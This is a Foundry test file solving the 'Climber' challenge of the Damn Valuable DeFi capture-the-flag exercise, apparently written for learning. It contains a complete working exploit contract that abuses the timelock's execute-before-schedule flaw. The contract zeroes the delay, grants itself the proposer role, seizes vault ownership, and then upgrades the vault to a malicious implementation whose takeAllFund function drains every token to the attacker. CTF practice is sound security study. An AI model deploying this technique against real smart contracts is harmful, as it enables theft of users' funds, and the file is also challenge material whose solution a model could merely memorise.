// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {DamnValuableToken} from "../src/DamnValuableToken.sol";
import {ClimberVault} from "../src/climber/ClimberVault.sol";
import {ClimberTimelock, CallerNotTimelock} from "../src/climber/ClimberTimelock.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";

import "@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol";
import "@openzeppelin/contracts-upgradeable/access/OwnableUpgradeable.sol";
import "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";

/*  
有升级金库合约权限的是 ClimberTimelock
*/

contract VaultV2 is Initializable, OwnableUpgradeable, UUPSUpgradeable {
    uint256 private _lastWithdrawalTimestamp;
    address private _sweeper;

    /// @custom:oz-upgrades-unsafe-allow constructor
    constructor() {
        _disableInitializers();
    }

    function initialize() public initializer {
        __Ownable_init();
        __UUPSUpgradeable_init();
    }

    function version() public pure returns (uint256) {
        return 2;
    }

    function takeAllFund(address token) public {
        DamnValuableToken(token).transfer(
            msg.sender,
            DamnValuableToken(token).balanceOf(address(this))
        );
    }

    function _authorizeUpgrade(
        address newImplementation
    ) internal override onlyOwner {}
}

contract ClimbHack {
    ClimberVault vault;
    ClimberTimelock timelock;

    address[] public targets;
    uint256[] public values;
    bytes[] public dataElements;

    constructor(ClimberVault _vault, ClimberTimelock _timelock) {
        vault = _vault;
        timelock = _timelock;
    }

    function exploit() external {
        targets = new address[](4);
        values = new uint256[](4);
        dataElements = new bytes[](4);

        targets[0] = address(timelock);
        values[0] = 0;
        dataElements[0] = abi.encodeWithSignature("updateDelay(uint64)", 0);

        targets[1] = address(timelock);
        values[1] = 0;
        dataElements[1] = abi.encodeWithSignature(
            "grantRole(bytes32,address)",
            keccak256("PROPOSER_ROLE"),
            address(this)
        );

        targets[2] = address(vault);
        values[2] = 0;
        dataElements[2] = abi.encodeWithSignature(
            "transferOwnership(address)",
            address(this)
        );

        targets[3] = address(this);
        values[3] = 0;
        dataElements[3] = abi.encodeWithSignature("schedule()");

        timelock.execute(targets, values, dataElements, "0x");
    }

    function upgrade() public {
        VaultV2 vaultV2 = new VaultV2();
        vault.upgradeTo(address(vaultV2));
    }

    function schedule() external {
        timelock.schedule(targets, values, dataElements, "0x");
    }
}

contract ClimbTest is Test {
    DamnValuableToken public token;
    ClimberVault vault;
    address vaulrProxy;
    ClimberTimelock timelock;

    address deployer = makeAddr("deployer");
    address proposer = makeAddr("proposer");
    address sweeper = makeAddr("sweeper");
    address player = makeAddr("player");

    uint256 PLAYER_INITIAL_ETH_BALANCE = 0.1 ether;
    uint256 VAULT_TOKEN_BALANCE = 10000000 ether;
    uint64 TIMELOCK_DELAY = 60 * 60;

    modifier excuteByUser(address _user) {
        vm.startPrank(_user);
        _;
        vm.stopPrank();
    }

    function setUp() public excuteByUser(deployer) {
        deal(player, PLAYER_INITIAL_ETH_BALANCE);

        // Deploy the vault behind a proxy using the UUPS pattern,
        // passing the necessary addresses for the `ClimberVault::initialize(address,address,address)` function
        vaulrProxy = address(new ERC1967Proxy(address(new ClimberVault()), ""));
        vault = ClimberVault(vaulrProxy);
        vault.initialize(deployer, proposer, sweeper);

        assertEq(vault.getSweeper(), sweeper);
        assertGt(vault.getLastWithdrawalTimestamp(), 0);

        assertFalse(vault.owner() == address(0));
        assertFalse(vault.owner() == deployer);

        // Instantiate timelock
        timelock = ClimberTimelock(payable(vault.owner()));
        assertEq(timelock.delay(), TIMELOCK_DELAY);

        // Ensure timelock delay is correct and cannot be changed_
        vm.expectRevert(CallerNotTimelock.selector);
        timelock.updateDelay(TIMELOCK_DELAY + 1);

        // Ensure timelock roles are correctly initialized
        assertEq(timelock.hasRole(keccak256("PROPOSER_ROLE"), proposer), true);
        assertEq(timelock.hasRole(keccak256("ADMIN_ROLE"), deployer), true);
        assertEq(
            timelock.hasRole(keccak256("ADMIN_ROLE"), address(timelock)),
            true
        );

        // Deploy token and transfer initial token balance to the vault
        token = new DamnValuableToken();
        token.transfer(address(vault), VAULT_TOKEN_BALANCE);
    }

    function testExploit() public excuteByUser(player) {
        /*
        set hacker is the PROPOSER_ROLE
        timelock -> grantRole -> schedule -> updateDelay -> execute
        */
        ClimbHack hacker = new ClimbHack(vault, timelock);
        hacker.exploit();
        hacker.upgrade();

        VaultV2(vaulrProxy).takeAllFund(address(token));

        assertEq(token.balanceOf(address(vault)), 0);
        assertEq(token.balanceOf(player), VAULT_TOKEN_BALANCE);
    }

    function takeSome() public {
        VaultV2 vaultV2 = new VaultV2();
        vm.prank(address(timelock));
        vault.upgradeTo(address(vaultV2));

        vm.prank(address(timelock));
        timelock.grantRole(keccak256("PROPOSER_ROLE"), player);

        vm.prank(player);
        address[] memory targets = new address[](1);
        uint256[] memory values = new uint256[](1);
        bytes[] memory dataElements = new bytes[](1);
        targets[0] = address(timelock);
        values[0] = 0;
        dataElements[0] = "";
        timelock.schedule(targets, values, dataElements, 0);
    }
}
